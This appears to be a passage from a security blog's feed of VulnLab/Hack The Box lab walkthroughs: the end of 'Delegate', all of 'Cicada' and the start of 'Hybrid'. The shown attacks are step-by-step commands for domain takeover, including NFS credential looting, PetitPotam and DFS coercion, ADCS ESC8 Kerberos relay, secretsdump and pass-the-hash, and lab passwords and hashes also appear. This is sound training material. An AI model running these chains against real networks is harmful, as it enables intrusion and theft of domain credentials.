--additional</span><br></pre></td></tr></table></figure><p>First, we need to convert the machine account password to the correct hash format:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iconv -f ASCII -t UTF-16LE &lt;(printf &#x27;HelloWorld123&#x27;) | openssl dgst -md4</span><br><span class="line">MD4(stdin)= 97f8b5c01517c9d59e586246f7c1803c</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ./krbrelayx.py -hashes :97f8b5c01517c9d59e586246f7c1803c</span><br></pre></td></tr></table></figure><p>Then we execute PetitPotam to trigger the authentication:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 PetitPotam.py -u &#x27;Evil$&#x27; -p &#x27;HelloWorld123&#x27; Evil.delegate.vl 10.10.64.93</span><br></pre></td></tr></table></figure><p><img src="/images/Delegate/deleation.png" alt="Delegation Attack"><br><img src="/images/Delegate/delegation_worked.png" alt="Delegation Success"></p><p>We successfully obtained a silver ticket, which we now import:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=DC1\$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass DC1.delegate.vl</span><br></pre></td></tr></table></figure><p><a href="https://api.vulnlab.com/api/v1/share?id=c2872ceb-fa95-40cc-8623-396d1af89810">https://api.vulnlab.com/api/v1/share?id=c2872ceb-fa95-40cc-8623-396d1af89810</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Cicada</title>
      <link href="/2025/03/30/VL-Cicada/"/>
      <url>/2025/03/30/VL-Cicada/</url>
      
        <content type="html"><![CDATA[<h1 id="Cicada-Advanced-ADCS-Exploitation-and-Kerberos-Relay-Attacks"><a href="#Cicada-Advanced-ADCS-Exploitation-and-Kerberos-Relay-Attacks" class="headerlink" title="Cicada: Advanced ADCS Exploitation and Kerberos Relay Attacks"></a>Cicada: Advanced ADCS Exploitation and Kerberos Relay Attacks</h1><p>In this detailed VulnLab - Hack The Box walkthrough of the “Cicada” machine, we explore advanced Active Directory Certificate Services (ADCS) exploitation techniques combined with sophisticated Kerberos relay attacks. Our journey begins with discovering an exposed NFS share containing user credentials hidden within image files, followed by Kerberos-based authentication due to NTLM restrictions. The challenge showcases the ESC8 vulnerability in ADCS and demonstrates two distinct exploitation paths: a Windows-based approach using RemoteKrbRelay and a Linux-based method leveraging krbrelayx with DFS coercion. This comprehensive walkthrough highlights cutting-edge certificate template abuse techniques and demonstrates how modern attackers can bypass traditional authentication mechanisms to achieve complete domain compromise.</p><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>Starting with a port scan to identify available services:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE       REASON          VERSION</span><br><span class="line">53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus</span><br><span class="line">80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|   Supported Methods: OPTIONS TRACE GET HEAD POST</span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-03-28 11:04:14Z)</span><br><span class="line">111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/tcp6  rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp6  rpcbind</span><br><span class="line">|   100003  2,3         2049/udp   nfs</span><br><span class="line">|   100003  2,3         2049/udp6  nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="line">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3       2049/tcp   mountd</span><br><span class="line">|   100005  1,2,3       2049/tcp6  mountd</span><br><span class="line">|   100005  1,2,3       2049/udp   mountd</span><br><span class="line">|   100005  1,2,3       2049/udp6  mountd</span><br><span class="line">|   100021  1,2,3,4     2049/tcp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/tcp6  nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp   nlockmgr</span><br><span class="line">|   100021  1,2,3,4     2049/udp6  nlockmgr</span><br><span class="line">|   100024  1           2049/tcp   status</span><br><span class="line">|   100024  1           2049/tcp6  status</span><br><span class="line">|   100024  1           2049/udp   status</span><br><span class="line">|_  100024  1           2049/udp6  status</span><br><span class="line">135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds? syn-ack ttl 127</span><br><span class="line">464/tcp   open  kpasswd5?     syn-ack ttl 127</span><br><span class="line">593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl</span><br><span class="line">3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory </span><br><span class="line">3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services</span><br><span class="line">5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 </span><br><span class="line">9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing</span><br><span class="line">49503/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">50006/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br><span class="line">62920/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC</span><br></pre></td></tr></table></figure><p>The scan reveals we’re dealing with a Windows Active Directory environment (Domain: cicada.vl) with multiple services running, including NFS, which presents an interesting initial attack vector.</p><h2 id="NFS-Enumeration"><a href="#NFS-Enumeration" class="headerlink" title="NFS Enumeration"></a>NFS Enumeration</h2><p>Checking for available NFS shares:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ showmount -e 10.10.107.186 </span><br><span class="line">Export list for 10.10.107.186:</span><br><span class="line">/profiles (everyone)        </span><br></pre></td></tr></table></figure><p>Mounting the exposed NFS share:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t nfs -o vers=3 10.10.107.186:/profiles /mnt/ -o nolock</span><br></pre></td></tr></table></figure><p>After mounting, we discovered several potential usernames:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Administrator  </span><br><span class="line">Daniel.Marshall  </span><br><span class="line">Debra.Wright  </span><br><span class="line">Jane.Carter  </span><br><span class="line">Jordan.Francis  </span><br><span class="line">Joyce.Andrews  </span><br><span class="line">Katie.Ward  </span><br><span class="line">Megan.Simpson </span><br><span class="line">Richard.Gibbons  </span><br><span class="line">Rosie.Powell  </span><br><span class="line">Shirley.West</span><br></pre></td></tr></table></figure><h2 id="Initial-Access-via-NFS"><a href="#Initial-Access-via-NFS" class="headerlink" title="Initial Access via NFS"></a>Initial Access via NFS</h2><p>Exploring Rosie Powell’s directory:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(panosoiko㉿kali)-[/mnt/Rosie.Powell]</span><br><span class="line">└─$ ls -la</span><br><span class="line">total 1797</span><br><span class="line">drwxrwxrwx 2 4294967294 4294967294      64 Sep 15  2024 .</span><br><span class="line">drwxrwxrwx 2 4294967294 4294967294    4096 Sep 15  2024 ..</span><br><span class="line">drwx------ 2 4294967294 4294967294      64 Sep 15  2024 Documents</span><br><span class="line">-rwx------ 1 4294967294 4294967294 1832505 Sep 13  2024 marketing.png</span><br></pre></td></tr></table></figure><p>The file permissions suggest we need to match the UID to access these files. Setting read permissions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod +r /mnt/Rosie.Powell/marketing.png</span><br></pre></td></tr></table></figure><p>Opening the marketing.png file revealed credentials:</p><p>Rosie.Powell : Cicada123</p><p><img src="/images/Cicada/png_pass.png" alt="Password found in marketing.png"></p><h2 id="Authentication-Attempts"><a href="#Authentication-Attempts" class="headerlink" title="Authentication Attempts"></a>Authentication Attempts</h2><p>When attempting to use these credentials over SMB, we encountered <code>STATUS_NOT_SUPPORTED</code>:</p><p><img src="/images/Cicada/smb_enum.png" alt="SMB authentication failure"></p><p>Instead, we’ll request a Kerberos TGT (Ticket Granting Ticket) and use Kerberos authentication:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/Rosie.Powell:Cicada123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Rosie.Powell.ccache</span><br></pre></td></tr></table></figure><p>With Kerberos authentication, we now have access to LDAP and SMB:</p><p><img src="/images/Cicada/smb_ldap_access.png" alt="Successful LDAP and SMB access"></p><h2 id="Domain-Enumeration-with-BloodHound"><a href="#Domain-Enumeration-with-BloodHound" class="headerlink" title="Domain Enumeration with BloodHound"></a>Domain Enumeration with BloodHound</h2><p>Collecting Active Directory information with BloodHound:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap DC-JPQ225.cicada.vl -k --use-kcache --bloodhound --dns-server 10.10.101.214 -c All --dns-tcp</span><br></pre></td></tr></table></figure><p>No clear path to domain controller was initially visible in BloodHound.</p><h2 id="Active-Directory-Certificate-Services-ADCS-Enumeration"><a href="#Active-Directory-Certificate-Services-ADCS-Enumeration" class="headerlink" title="Active Directory Certificate Services (ADCS) Enumeration"></a>Active Directory Certificate Services (ADCS) Enumeration</h2><p>Investigating certificate services for potential vulnerabilities:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -k -target DC-JPQ225.cicada.vl -dc-ip 10.10.101.214 -debug</span><br></pre></td></tr></table></figure><p>Output revealed important certificate authority information:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">CA Name                             : cicada-DC-JPQ225-CA</span><br><span class="line">DNS Name                            : DC-JPQ225.cicada.vl</span><br><span class="line">Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl</span><br><span class="line">Certificate Serial Number           : 1538EE585D915EB645C3B10CF9747B7C</span><br><span class="line">Certificate Validity Start          : 2025-03-28 17:51:10+00:00</span><br><span class="line">Certificate Validity End            : 2525-03-28 18:01:10+00:00</span><br><span class="line">Web Enrollment                      : Enabled</span><br><span class="line">User Specified SAN                  : Disabled</span><br><span class="line">Request Disposition                 : Issue</span><br><span class="line">Enforce Encryption for Requests     : Enabled</span><br><span class="line">Permissions</span><br><span class="line">  Owner                             : CICADA.VL\Administrators</span><br><span class="line">  Access Rights</span><br><span class="line">    ManageCertificates              : CICADA.VL\Administrators</span><br><span class="line">                                      CICADA.VL\Domain Admins</span><br><span class="line">                                      CICADA.VL\Enterprise Admins</span><br><span class="line">    ManageCa                        : CICADA.VL\Administrators</span><br><span class="line">                                      CICADA.VL\Domain Admins</span><br><span class="line">                                      CICADA.VL\Enterprise Admins</span><br><span class="line">    Enroll                          : CICADA.VL\Authenticated Users</span><br><span class="line">[!] Vulnerabilities</span><br><span class="line">  ESC8                              : Web Enrollment is enabled and Request Disposition is set to Issue</span><br></pre></td></tr></table></figure><p>Discovery of ESC8 vulnerability opens several potential attack paths. Checking for resource-based constrained delegation vulnerabilities:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb DC-JPQ225.cicada.vl -k --use-kcache -M coerce_plus</span><br></pre></td></tr></table></figure><p><img src="/images/Cicada/vulnerable.png" alt="Vulnerable services"></p><p>None of those attacks worked, but we identified a new approach using Kerberos Relay to exploit ESC8: <a href="https://github.com/CICADA8-Research/RemoteKrbRelay">https://github.com/CICADA8-Research/RemoteKrbRelay</a></p><h2 id="Machine-Account-Quota-Check"><a href="#Machine-Account-Quota-Check" class="headerlink" title="Machine Account Quota Check"></a>Machine Account Quota Check</h2><p>Verifying if we can add machine accounts to the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc ldap DC-JPQ225.cicada.vl -k --use-kcache -M maq</span><br></pre></td></tr></table></figure><p><img src="/images/Cicada/machineaccountquota.png" alt="Machine Account Quota"></p><p>With a machine account quota of 10, we can domain join our own Windows VM or use a TGT &amp; RPCSS TGS on a non-domain joined Windows machine.</p><h2 id="Exploitation-Path-1-Windows-VM-Approach"><a href="#Exploitation-Path-1-Windows-VM-Approach" class="headerlink" title="Exploitation Path 1: Windows VM Approach"></a>Exploitation Path 1: Windows VM Approach</h2><h3 id="Setting-Up-the-Windows-VM"><a href="#Setting-Up-the-Windows-VM" class="headerlink" title="Setting Up the Windows VM"></a>Setting Up the Windows VM</h3><ol><li><p>Install and configure OpenVPN on the Windows VM:<br><img src="/images/Cicada/install_openvpn.png" alt="OpenVPN installation"></p></li><li><p>Set the DNS IP to the domain controller:<br><img src="/images/Cicada/dns_ip.png" alt="Network settings"><br><img src="/images/Cicada/dc_ip.png" alt="DC IP configuration"></p></li><li><p>Rename the PC and join the domain:<br><img src="/images/Cicada/pc_rename.png" alt="PC rename"><br><img src="/images/Cicada/changing_domain.png" alt="Domain joining"><br><img src="/images/Cicada/cicada_share.png" alt="Cicada share access"></p><p>Note: Windows 10 Pro or Windows Server is required for domain joining.</p></li></ol><h3 id="Building-and-Running-the-Exploit"><a href="#Building-and-Running-the-Exploit" class="headerlink" title="Building and Running the Exploit"></a>Building and Running the Exploit</h3><ol><li><p>Clone the RemoteKrbRelay repository and open the solution file in Visual Studio:<br><img src="/images/Cicada/compile.png" alt="Compiling the exploit"></p></li><li><p>Select Release, then x64, and build the solution. The executable will be in <code>[SolutionFolder]\[ProjectFolder]\bin\Release\</code></p></li><li><p>Run the following command to get a base64-encoded certificate (requires logging in as Rosie, starting VPN, then changing users):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RemoteKrbRelay.exe -adcs -template DomainController -victim dc-jpq225.cicada.vl -target dc-jpq225.cicada.vl -clsid d99e6e74-fc88-11d0-b498-00a0c90312f3</span><br></pre></td></tr></table></figure><p>Note: This approach may be blocked by firewalls preventing RPC access.</p></li><li><p>If successful, use the certificate to get a TGT:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 gettgtpkinit.py -pfx-base64 $(cat ./cert.pkcs12) -dc-ip IP cicada.vl/&#x27;DC-JPQ225$&#x27; adm.ccache</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=./adm.ccache</span><br></pre></td></tr></table></figure></li><li><p>Extract secrets from the domain controller:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump cicada.vl/&#x27;DC-JPQ225$&#x27;@DC-JPQ225.cicada.vl -k -no-pass</span><br></pre></td></tr></table></figure></li><li><p>Get a TGT for the admin and establish a shell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/adminstrator@DC-JPQ225.cicada.vl -hashes</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=./adminstrator.ccache</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-wmiexec cicada.vl/adminstrator@DC-JPQ225.cicada.vl -k -no-pass</span><br></pre></td></tr></table></figure></li></ol><h2 id="Exploitation-Path-2-Linux-Approach"><a href="#Exploitation-Path-2-Linux-Approach" class="headerlink" title="Exploitation Path 2: Linux Approach"></a>Exploitation Path 2: Linux Approach</h2><ol><li><p>Add our machine to the domain:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host DC-JPQ225.cicada.vl -u &#x27;rosie.powell&#x27; -p &#x27;Cicada123&#x27; -k -d &#x27;cicada.vl&#x27; add dnsRecord &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#x27; 10.8.5.195</span><br></pre></td></tr></table></figure></li><li><p>Run krbrelayx to wait for a connection:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 krbrelayx.py -t &#x27;http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp&#x27; --adcs --template DomainController -v &#x27;DC-JPQ225$&#x27;</span><br></pre></td></tr></table></figure></li><li><p>Trigger a connection back to us using dfscoerce to get the .pfx certificate:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dfscoerce.py -k -no-pass &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA&#x27; dc-jpq225.cicada.vl</span><br></pre></td></tr></table></figure><p>Output:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[-] Connecting to ncacn_np:dc-jpq225.cicada.vl[\PIPE\netdfs]</span><br><span class="line">[+] Successfully bound!</span><br><span class="line">[-] Sending NetrDfsRemoveStdRoot!</span><br><span class="line">NetrDfsRemoveStdRoot </span><br><span class="line">ServerName:                      &#x27;dc-jpq2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\x00&#x27; </span><br><span class="line">RootShare:                       &#x27;test\x00&#x27; </span><br><span class="line">ApiFlags:                        1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DFSNM SessionError: code: 0x35 - ERROR_BAD_NETPATH - The network path was not found.</span><br></pre></td></tr></table></figure><p><img src="/images/Cicada/getting-pfx.png" alt="Getting PFX certificate"></p></li><li><p>Process the certificate using OpenSSL:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -in &#x27;DC-JPQ225$.pfx&#x27; -nodes -nocerts -out key.pem -passin pass:</span><br><span class="line">openssl pkcs12 -in &#x27;DC-JPQ225$.pfx&#x27; -nodes -nokeys -out cert.pem -passin pass:</span><br></pre></td></tr></table></figure></li><li><p>Create a new PKCS12 file without password:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl pkcs12 -export -in cert.pem -inkey key.pem -out DC-JPQ225-nopass.pfx -passout pass:</span><br></pre></td></tr></table></figure></li><li><p>Use Certipy to authenticate with the certificate:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx &#x27;DC-JPQ225-nopass.pfx&#x27; -dc-ip 10.10.71.16 -domain cicada.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] Using principal: dc-jpq225$@cicada.vl</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to &#x27;dc-jpq225.ccache&#x27;</span><br><span class="line">[*] Trying to retrieve NT hash for &#x27;dc-jpq225$&#x27;</span><br><span class="line">[*] Got hash for &#x27;dc-jpq225$@cicada.vl&#x27;: aad3b435b51404eeaad3b435b51404ee:85a0da53871a----------</span><br></pre></td></tr></table></figure></li><li><p>Set up the Kerberos credential cache:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=dc-jpq225.ccache</span><br></pre></td></tr></table></figure></li><li><p>Extract all domain secrets:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -k -no-pass DC-JPQ225.cicada.vl</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a----------:::</span><br></pre></td></tr></table></figure></li><li><p>Finally, get a TGT for the Administrator:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-getTGT cicada.vl/Administrator -hashes :85a0da53871a---------- -dc-ip 10.10.71.16</span><br></pre></td></tr></table></figure></li></ol><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://api.vulnlab.com/api/v1/share?id=4cc00787-bbf1-4974-a4bc-c40f0fb8521f">https://api.vulnlab.com/api/v1/share?id=4cc00787-bbf1-4974-a4bc-c40f0fb8521f</a></p><p><a href="https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx">https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> VulnLab </tag>
            
            <tag> Hack The Box </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VL-Hybrid</title>
      <link href="/2025/03/28/VL-Hybrid/"/>
      <url>/2025/03/28/VL-Hybrid/</url>
      
        <content type="html"><![CDATA[<h1 id="Hybrid-Combining-Linux-and-Active-Directory-Exploitation-Techniques"><a href="#Hybrid-Combining-Linux-and-Active-Directory-Exploitation-Techniques" class="headerlink" title="Hybrid: Combining Linux and Active Directory Exploitation Techniques"></a>Hybrid: Combining Linux and Active Directory Exploitation Techniques</h1><p>In this detailed VulnLab - Hack The Box  walkthrough of the “Hybrid” machine, we navigate through a complex environment that combines Linux mail server exploitation with Active Directory Certificate Services abuse. Our journey begins with discovering an NFS share containing sensitive backup files, which leads to credential harvesting and a Roundcube webmail RCE vulnerability exploitation. We then pivot to more advanced techniques, including a sophisticated NFS UID manipulation attack to gain access as another user. The final phase demonstrates how to leverage ESC1 (ADCS template misconfiguration) vulnerabilities to elevate privileges and ultimately achieve domain administrator access. This challenge showcases the importance of understanding both Linux and Windows attack vectors in hybrid enterprise environments.</p><h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><h3 id="mail01-hybrid-vl"><a href="#mail01-hybrid-vl" class="headerlink" title="mail01.hybrid.vl"></a>mail01.hybrid.vl</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE  REASON         VERSION</span><br><span class="line">22/tcp    open  ssh      syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu)</span><br><span class="line">25/tcp    open  smtp     syn-ack ttl 63 Postfix smtpd</span><br><span class="line">|_smtp-commands: mail01.hybrid.vl, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, AUTH PLAIN LOGIN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, CHUNKING</span><br><span class="line">80/tcp    open  http     syn-ack ttl 63 nginx 1.18.0 (Ubuntu)</span><br><span class="line">110/tcp   open  pop3     syn-ack ttl 63 Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: UIDL CAPA PIPELINING STLS TOP RESP-CODES SASL AUTH-RESP-CODE</span><br><span class="line">111/tcp   open  rpcbind  syn-ack ttl 63 2-4 (RPC #100000)</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="line">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="line">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111/udp6  rpcbind</span><br><span class="line">|   100003  3,4         2049/tcp   nfs</span><br><span class="line">|   100003  3,4         2049/tcp6  nfs</span><br><span class="line">|   100005  1,2,3      34727/udp   mountd</span><br><span class="line">|   100005  1,2,3      54128/udp6  mountd</span><br><span class="line">|   100005  1,2,3      56559/tcp6  mountd</span><br><span class="line">|   100005  